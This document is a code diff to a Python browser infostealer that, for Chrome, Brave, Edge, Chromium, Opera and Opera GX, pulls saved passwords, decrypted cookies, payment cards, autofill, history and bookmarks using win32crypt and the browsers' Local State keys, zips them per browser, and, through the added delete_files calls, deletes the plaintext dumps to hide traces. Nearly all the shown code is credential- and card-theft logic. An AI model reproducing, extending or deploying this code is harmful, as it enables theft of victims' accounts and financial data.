@@ -13,27 +13,37 @@ import win32crypt
 
 
 ##?? use this function?
-def load_path(id):
-    try:
-        with open("todo.txt", "r") as f:
-            lines = f.readlines()
-            dir_path = lines[3].strip()
-            db_path = lines[4]
-            f.close()
-    except:
-        return
-        
-    if id == "dir":
-        return dir_path
-    elif id == "db":
-        return db_path
+#def load_path(id):
+#    try:
+#        with open("todo.txt", "r") as f:
+#            lines = f.readlines()
+#            dir_path = lines[3].strip()
+#            db_path = lines[4]
+#            f.close()
+#    except:
+#        return
+#        
+#    if id == "dir":
+#        return dir_path
+#    elif id == "db":
+#        return db_path
 ##?? use this function?
 
+def delete_files(files):
+    try:
+        for file in files:
+            try:
+                os.remove(file)
+            except:
+                pass
+    except:
+        return
+    
 def delete_file(file):
     try:
         os.remove(file)
     except:
-        pass
+        return
 
 def store_data(file, data):
     with open(file, "a", encoding="utf-8") as f:
@@ -383,7 +393,9 @@ def chrome():
     fetch_bookmarks(r"AppData\Local\Google\Chrome\User Data\Default\Bookmarks")
     fetch_payment(r"AppData\Local\Google\Chrome\User Data\Default\Web Data", r"AppData/Local/Google/Chrome/User Data/Local State")
     fetch_autofill(r"AppData\Local\Google\Chrome\User Data\Default\Web Data")
+    
     zip("Chrome.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+    delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
     
 def brave():
     fetch_passwords(r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
@@ -394,7 +406,9 @@ def brave():
     fetch_bookmarks(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks")
     fetch_payment(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
     fetch_autofill(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data")
+    
     zip("Brave.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+    delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
     
 def edge():
     fetch_passwords(r"AppData/Local/Microsoft/Edge/User Data/Default/Login Data", r"AppData/Local/Microsoft/Edge/User Data/Local State")
@@ -405,7 +419,9 @@ def edge():
     fetch_bookmarks(r"AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks")
     fetch_payment(r"AppData\Local\Microsoft\Edge\User Data\Default\Web Data", r"AppData/Local/Microsoft/Edge/User Data/Local State")
     fetch_autofill(r"AppData\Local\Microsoft\Edge\User Data\Default\Web Data")
+    
     zip("Edge.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+    delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
 
 def chromium():
     fetch_passwords(r"AppData/Local/Chromium/User Data/Default/Login Data", r"AppData/Local/Chromium/User Data/Local State")
@@ -416,7 +432,9 @@ def chromium():
     fetch_bookmarks(r"AppData\Local\Chromium\User Data\Default\Bookmarks")
     fetch_payment(r"AppData\Local\Chromium\User Data\Default\Web Data", r"AppData/Local/Chromium/User Data/Local State")
     fetch_autofill(r"AppData\Local\Chromium\User Data\Default\Web Data")
+    
     zip("Chromium.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+    delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
 
 def opera():
     fetch_passwords(r"AppData/Local/Opera Software/Opera Stable/User Data/Default/Login Data", r"AppData/Local/Opera Software/Opera Stable/User Data/Local State")
@@ -427,7 +445,9 @@ def opera():
     fetch_bookmarks(r"AppData\Local\Opera Software\Opera Stable\User Data\Default\Bookmarks")
     fetch_payment(r"AppData\Local\Opera Software\Opera Stable\User Data\Default\Web Data", r"AppData/Local/Opera Software/Opera Stable/User Data/Local State")
     fetch_autofill(r"AppData\Local\Opera Software\Opera Stable\User Data\Default\Web Data")
+    
     zip("Opera.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+    delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
 
 def opera_gx():
     fetch_passwords(r"AppData/Local/Opera Software/Opera GX Stable/User Data/Default/Login Data", r"AppData/Local/Opera Software/Opera GX Stable/User Data/Local State")
@@ -438,7 +458,9 @@ def opera_gx():
     fetch_bookmarks(r"AppData\Local\Opera Software\Opera GX Stable\User Data\Default\Bookmarks")
     fetch_payment(r"AppData\Local\Opera Software\Opera GX Stable\User Data\Default\Web Data", r"AppData/Local/Opera Software/Opera GX Stable/User Data/Local State")
     fetch_autofill(r"AppData\Local\Opera Software\Opera GX Stablee\User Data\Default\Web Data")
-    zip("Opera.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+    
+    zip("OperaGX.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+    delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
     
     
 def run():
